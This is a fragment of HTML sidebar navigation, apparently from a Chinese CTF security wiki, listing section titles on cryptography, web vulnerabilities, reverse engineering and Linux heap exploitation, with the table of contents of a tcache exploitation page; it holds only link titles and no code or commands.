  <li class="md-nav__item">
    <a href="../../../../crypto/asymmetric/rsa/rsa_chosen_plain_cipher/" title="选择明密文攻击" class="md-nav__link">
      选择明密文攻击
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/asymmetric/rsa/rsa_side_channel/" title="侧信道攻击" class="md-nav__link">
      侧信道攻击
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/asymmetric/rsa/rsa_pkcs_attack/" title="Bleichenbacher 攻击" class="md-nav__link">
      Bleichenbacher 攻击
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/asymmetric/rsa/rsa_complex/" title="综合" class="md-nav__link">
      综合
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/asymmetric/knapsack/knapsack/" title="背包加密" class="md-nav__link">
      背包加密
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-3-6-4" type="checkbox" id="nav-3-6-4">
    
    <label class="md-nav__link" for="nav-3-6-4">
      离散对数相关
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="3">
      <label class="md-nav__title" for="nav-3-6-4">
        离散对数相关
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/asymmetric/discrete-log/discrete-log/" title="离散对数" class="md-nav__link">
      离散对数
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/asymmetric/discrete-log/elgamal/" title="Elgamal" class="md-nav__link">
      Elgamal
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/asymmetric/discrete-log/ecc/" title="ECC" class="md-nav__link">
      ECC
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-3-6-5" type="checkbox" id="nav-3-6-5">
    
    <label class="md-nav__link" for="nav-3-6-5">
      格密码
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="3">
      <label class="md-nav__title" for="nav-3-6-5">
        格密码
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/asymmetric/lattice/overview/" title="格概述" class="md-nav__link">
      格概述
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/asymmetric/lattice/introduction/" title="格介绍" class="md-nav__link">
      格介绍
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/asymmetric/lattice/lattice-reduction/" title="格基规约算法" class="md-nav__link">
      格基规约算法
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-3-7" type="checkbox" id="nav-3-7">
    
    <label class="md-nav__link" for="nav-3-7">
      哈希函数
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
      <label class="md-nav__title" for="nav-3-7">
        哈希函数
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/hash/introduction/" title="哈希函数简介" class="md-nav__link">
      哈希函数简介
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/hash/md5/" title="MD5" class="md-nav__link">
      MD5
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/hash/sha1/" title="SHA1" class="md-nav__link">
      SHA1
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/hash/fnv/" title="FNV" class="md-nav__link">
      FNV
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/hash/attack/" title="Hash Attack" class="md-nav__link">
      Hash Attack
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/hash/complex/" title="综合" class="md-nav__link">
      综合
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-3-8" type="checkbox" id="nav-3-8">
    
    <label class="md-nav__link" for="nav-3-8">
      数字签名
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
      <label class="md-nav__title" for="nav-3-8">
        数字签名
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/signature/introduction/" title="数字签名简介" class="md-nav__link">
      数字签名简介
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/signature/rsa/" title="RSA 数字签名" class="md-nav__link">
      RSA 数字签名
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/signature/elgamal/" title="ElGamal 数字签名" class="md-nav__link">
      ElGamal 数字签名
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/signature/dsa/" title="DSA 数字签名" class="md-nav__link">
      DSA 数字签名
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-3-9" type="checkbox" id="nav-3-9">
    
    <label class="md-nav__link" for="nav-3-9">
      攻击思想总结
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
      <label class="md-nav__title" for="nav-3-9">
        攻击思想总结
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/attack-summary/attack-mode/" title="简介" class="md-nav__link">
      简介
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/attack-summary/meet-in-the-middle/" title="中间相遇攻击" class="md-nav__link">
      中间相遇攻击
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/attack-summary/bit-attack/" title="比特攻击" class="md-nav__link">
      比特攻击
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/certificate/introduction/" title="证书格式" class="md-nav__link">
      证书格式
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

    
      
      
      


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-4" type="checkbox" id="nav-4">
    
    <label class="md-nav__link" for="nav-4">
      Web
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
      <label class="md-nav__title" for="nav-4">
        Web
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../web/introduction/" title="Web 应用简介" class="md-nav__link">
      Web 应用简介
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../web/sqli/" title="SQL 注入" class="md-nav__link">
      SQL 注入
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../web/xss/" title="XSS 跨站脚本攻击" class="md-nav__link">
      XSS 跨站脚本攻击
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../web/csrf/" title="CSRF 跨站请求伪造" class="md-nav__link">
      CSRF 跨站请求伪造
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../web/ssrf/" title="SSRF 服务端请求伪造" class="md-nav__link">
      SSRF 服务端请求伪造
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../web/php/php/" title="PHP 代码审计" class="md-nav__link">
      PHP 代码审计
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

    
      
      
      


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-5" type="checkbox" id="nav-5">
    
    <label class="md-nav__link" for="nav-5">
      Assembly
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
      <label class="md-nav__title" for="nav-5">
        Assembly
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../assembly/x86-x64/readme/" title="x86_x64" class="md-nav__link">
      x86_x64
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../assembly/mips/readme/" title="mips" class="md-nav__link">
      mips
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../assembly/arm/readme/" title="arm" class="md-nav__link">
      arm
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

    
      
      
      


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-6" type="checkbox" id="nav-6">
    
    <label class="md-nav__link" for="nav-6">
      Executable
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
      <label class="md-nav__title" for="nav-6">
        Executable
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-6-1" type="checkbox" id="nav-6-1">
    
    <label class="md-nav__link" for="nav-6-1">
      ELF 文件
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
      <label class="md-nav__title" for="nav-6-1">
        ELF 文件
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../executable/elf/elf-structure/" title="ELF文件基本结构" class="md-nav__link">
      ELF文件基本结构
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../executable/elf/program-loading/" title="程序加载" class="md-nav__link">
      程序加载
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../executable/elf/program-linking/" title="程序链接" class="md-nav__link">
      程序链接
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../executable/elf/running-overview/" title="程序执行流程" class="md-nav__link">
      程序执行流程
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
      </ul>
    </nav>
  </li>

    
      
      
      


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-7" type="checkbox" id="nav-7">
    
    <label class="md-nav__link" for="nav-7">
      Reverse
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
      <label class="md-nav__title" for="nav-7">
        Reverse
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-7-1" type="checkbox" id="nav-7-1">
    
    <label class="md-nav__link" for="nav-7-1">
      Reverse Overview
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
      <label class="md-nav__title" for="nav-7-1">
        Reverse Overview
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../reverse/introduction/" title="软件逆向工程简介" class="md-nav__link">
      软件逆向工程简介
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../reverse/Identify-Encode-Encryption/introduction/" title="常见加密算法和编码识别" class="md-nav__link">
      常见加密算法和编码识别
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../reverse/maze/maze/" title="迷宫问题" class="md-nav__link">
      迷宫问题
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../reverse/vm/vm/" title="虚拟机指令分析" class="md-nav__link">
      虚拟机指令分析
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../reverse/unicorn/introduction/" title="Unicorn Engine 简介" class="md-nav__link">
      Unicorn Engine 简介
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-7-2" type="checkbox" id="nav-7-2">
    
    <label class="md-nav__link" for="nav-7-2">
      Linux Reverse
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
      <label class="md-nav__title" for="nav-7-2">
        Linux Reverse
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-7-2-1" type="checkbox" id="nav-7-2-1">
    
    <label class="md-nav__link" for="nav-7-2-1">
      Linux 逆向技术
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="3">
      <label class="md-nav__title" for="nav-7-2-1">
        Linux 逆向技术
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../reverse/linux/ld_preload/" title="LD_PRELOAD" class="md-nav__link">
      LD_PRELOAD
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../reverse/linux/false-disasm/" title="False Disassembly" class="md-nav__link">
      False Disassembly
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../reverse/linux/detect-bp/" title="Detecting Breakpoints" class="md-nav__link">
      Detecting Breakpoints
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../reverse/linux/detect-dbg/" title="Detecting debugging" class="md-nav__link">
      Detecting debugging
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-7-3" type="checkbox" id="nav-7-3">
    
    <label class="md-nav__link" for="nav-7-3">
      Windows Reverse
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
      <label class="md-nav__title" for="nav-7-3">
        Windows Reverse
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-7-3-1" type="checkbox" id="nav-7-3-1">
    
    <label class="md-nav__link" for="nav-7-3-1">
      脱壳技术
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="3">
      <label class="md-nav__title" for="nav-7-3-1">
        脱壳技术
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../reverse/windows/unpack/packer-introduction/" title="保护壳简介" class="md-nav__link">
      保护壳简介
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../reverse/windows/unpack/trace/" title="单步跟踪法" class="md-nav__link">
      单步跟踪法
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../reverse/windows/unpack/esp/" title="ESP 定律法" class="md-nav__link">
      ESP 定律法
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../reverse/windows/unpack/direct-oep/" title="一步到达 OEP 法" class="md-nav__link">
      一步到达 OEP 法
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../reverse/windows/unpack/memory/" title="内存镜像法" class="md-nav__link">
      内存镜像法
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../reverse/windows/unpack/last-exception/" title="最后一次异常法" class="md-nav__link">
      最后一次异常法
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../reverse/windows/unpack/sfx/" title="SFX 法" class="md-nav__link">
      SFX 法
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../reverse/windows/unpack/fix-iat/" title="DUMP 及 IAT 重建" class="md-nav__link">
      DUMP 及 IAT 重建
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../reverse/windows/unpack/manually-fix-iat/" title="手动查找 IAT 并使用 ImportREC 重建" class="md-nav__link">
      手动查找 IAT 并使用 ImportREC 重建
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../reverse/windows/unpack/unpack-dll/" title="DLL 文件脱壳" class="md-nav__link">
      DLL 文件脱壳
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-7-3-2" type="checkbox" id="nav-7-3-2">
    
    <label class="md-nav__link" for="nav-7-3-2">
      反调试技术
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="3">
      <label class="md-nav__title" for="nav-7-3-2">
        反调试技术
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../reverse/windows/anti-debug/ntglobalflag/" title="NtGlobalFlag" class="md-nav__link">
      NtGlobalFlag
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../reverse/windows/anti-debug/heap-flags/" title="Heap Flags" class="md-nav__link">
      Heap Flags
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../reverse/windows/anti-debug/the-heap/" title="The Heap" class="md-nav__link">
      The Heap
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../reverse/windows/anti-debug/int-3/" title="Interrupt 3" class="md-nav__link">
      Interrupt 3
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../reverse/windows/anti-debug/isdebuggerpresent/" title="IsDebuggerPresent" class="md-nav__link">
      IsDebuggerPresent
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../reverse/windows/anti-debug/checkremotedebuggerpresent/" title="CheckRemoteDebuggerPresent" class="md-nav__link">
      CheckRemoteDebuggerPresent
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../reverse/windows/anti-debug/ntqueryinformationprocess/" title="NtQueryInformationProcess" class="md-nav__link">
      NtQueryInformationProcess
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../reverse/windows/anti-debug/junk-code/" title="花指令" class="md-nav__link">
      花指令
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../reverse/windows/anti-debug/example/" title="反调试技术例题" class="md-nav__link">
      反调试技术例题
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
      </ul>
    </nav>
  </li>

        
      </ul>
    </nav>
  </li>

    
      
      
      

  


  <li class="md-nav__item md-nav__item--active md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-8" type="checkbox" id="nav-8" checked>
    
    <label class="md-nav__link" for="nav-8">
      Pwn
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
      <label class="md-nav__title" for="nav-8">
        Pwn
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-8-1" type="checkbox" id="nav-8-1">
    
    <label class="md-nav__link" for="nav-8-1">
      Pwn Overview
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
      <label class="md-nav__title" for="nav-8-1">
        Pwn Overview
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../readme/" title="Readme" class="md-nav__link">
      Readme
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          

  


  <li class="md-nav__item md-nav__item--active md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-8-2" type="checkbox" id="nav-8-2" checked>
    
    <label class="md-nav__link" for="nav-8-2">
      Linux Pwn
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
      <label class="md-nav__title" for="nav-8-2">
        Linux Pwn
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-8-2-1" type="checkbox" id="nav-8-2-1">
    
    <label class="md-nav__link" for="nav-8-2-1">
      安全防护机制
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="3">
      <label class="md-nav__title" for="nav-8-2-1">
        安全防护机制
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../mitigation/canary/" title="canary" class="md-nav__link">
      canary
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-8-2-2" type="checkbox" id="nav-8-2-2">
    
    <label class="md-nav__link" for="nav-8-2-2">
      栈溢出
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="3">
      <label class="md-nav__title" for="nav-8-2-2">
        栈溢出
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../stackoverflow/stack-intro/" title="栈介绍" class="md-nav__link">
      栈介绍
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../stackoverflow/stackoverflow-basic/" title="栈溢出原理" class="md-nav__link">
      栈溢出原理
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../stackoverflow/basic-rop/" title="基本 ROP" class="md-nav__link">
      基本 ROP
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../stackoverflow/medium-rop/" title="中级 ROP" class="md-nav__link">
      中级 ROP
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../stackoverflow/advanced-rop/" title="高级 ROP" class="md-nav__link">
      高级 ROP
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../stackoverflow/fancy-rop/" title="花式栈溢出" class="md-nav__link">
      花式栈溢出
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-8-2-3" type="checkbox" id="nav-8-2-3">
    
    <label class="md-nav__link" for="nav-8-2-3">
      格式化字符串漏洞
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="3">
      <label class="md-nav__title" for="nav-8-2-3">
        格式化字符串漏洞
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../fmtstr/fmtstr_intro/" title="格式化字符串漏洞原理介绍" class="md-nav__link">
      格式化字符串漏洞原理介绍
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../fmtstr/fmtstr_exploit/" title="格式化字符串漏洞利用" class="md-nav__link">
      格式化字符串漏洞利用
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../fmtstr/fmtstr_example/" title="格式化字符串漏洞例子" class="md-nav__link">
      格式化字符串漏洞例子
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../fmtstr/fmtstr_detect/" title="格式化字符串漏洞检测" class="md-nav__link">
      格式化字符串漏洞检测
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          

  


  <li class="md-nav__item md-nav__item--active md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-8-2-4" type="checkbox" id="nav-8-2-4" checked>
    
    <label class="md-nav__link" for="nav-8-2-4">
      Glibc Heap 利用
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="3">
      <label class="md-nav__title" for="nav-8-2-4">
        Glibc Heap 利用
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../introduction/" title="堆利用简介" class="md-nav__link">
      堆利用简介
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../heap_overview/" title="堆概述" class="md-nav__link">
      堆概述
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../heap_structure/" title="堆相关数据结构" class="md-nav__link">
      堆相关数据结构
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-8-2-4-4" type="checkbox" id="nav-8-2-4-4">
    
    <label class="md-nav__link" for="nav-8-2-4-4">
      深入理解 Ptmalloc2
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="4">
      <label class="md-nav__title" for="nav-8-2-4-4">
        深入理解 Ptmalloc2
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../implementation/overview/" title="概述" class="md-nav__link">
      概述
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../implementation/basic/" title="堆中的基本函数" class="md-nav__link">
      堆中的基本函数
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../implementation/heap-init/" title="堆初始化" class="md-nav__link">
      堆初始化
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../implementation/malloc/" title="申请堆内存" class="md-nav__link">
      申请堆内存
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../implementation/free/" title="释放堆内存" class="md-nav__link">
      释放堆内存
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../implementation/tcache/" title="Tcache" class="md-nav__link">
      Tcache
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../implementation/malloc_state/" title="malloc_state" class="md-nav__link">
      malloc_state
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../implementation/misc/" title="杂" class="md-nav__link">
      杂
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../heapoverflow_basic/" title="堆溢出" class="md-nav__link">
      堆溢出
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../off_by_one/" title="堆中的 Off-By-One" class="md-nav__link">
      堆中的 Off-By-One
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../unlink/" title="Unlink" class="md-nav__link">
      Unlink
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../use_after_free/" title="Use After Free" class="md-nav__link">
      Use After Free
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../fastbin_attack/" title="Fastbin Attack" class="md-nav__link">
      Fastbin Attack
    </a>
  </li>

        
          
          
          

  


  <li class="md-nav__item md-nav__item--active">
    
    <input class="md-toggle md-nav__toggle" data-md-toggle="toc" type="checkbox" id="__toc">
    
    
      <label class="md-nav__link md-nav__link--active" for="__toc">
        Tcache 利用
      </label>
    
    <a href="./" title="Tcache 利用" class="md-nav__link md-nav__link--active">
      Tcache 利用
    </a>
    
      
<nav class="md-nav md-nav--secondary">
  
  
  
    <label class="md-nav__title" for="__toc">目录</label>
    <ul class="md-nav__list" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#tcache-makes-heap-exploitation-easy-again" title="tcache makes heap exploitation easy again" class="md-nav__link">
    tcache makes heap exploitation easy again
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#0x01-tcache-overview" title="0x01 Tcache overview" class="md-nav__link">
    0x01 Tcache overview
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#0x02-tcache-usage" title="0x02 Tcache Usage" class="md-nav__link">
    0x02 Tcache Usage
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#0x03-pwn-tcache" title="0x03 Pwn Tcache" class="md-nav__link">
    0x03 Pwn Tcache
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#tcache-poisoning" title="tcache poisoning" class="md-nav__link">
    tcache poisoning
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#tcache-dup" title="tcache dup" class="md-nav__link">
    tcache dup
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#tcache-perthread-corruption" title="tcache perthread corruption" class="md-nav__link">
    tcache perthread corruption
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#tcache-house-of-spirit" title="tcache house of spirit" class="md-nav__link">
    tcache house of spirit
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#smallbin-unlink" title="smallbin unlink" class="md-nav__link">
    smallbin unlink
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#libc-leak" title="libc leak" class="md-nav__link">
    libc leak
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#0x04-tcache-check" title="0x04 Tcache Check" class="md-nav__link">
    0x04 Tcache Check
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#0x05-the-pwn-of-ctf" title="0x05 The pwn of CTF" class="md-nav__link">
    0x05 The pwn of CTF
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#challenge-1-lctf2018-pwn-easy_heap" title="Challenge 1 : LCTF2018 PWN easy_heap" class="md-nav__link">
    Challenge 1 : LCTF2018 PWN easy_heap
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#_1" title="基本信息" class="md-nav__link">
    基本信息
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_2" title="基本功能" class="md-nav__link">
    基本功能
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_3" title="利用思路" class="md-nav__link">
    利用思路
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_4" title="操作过程" class="md-nav__link">
    操作过程
  </a>
  
</li>
        
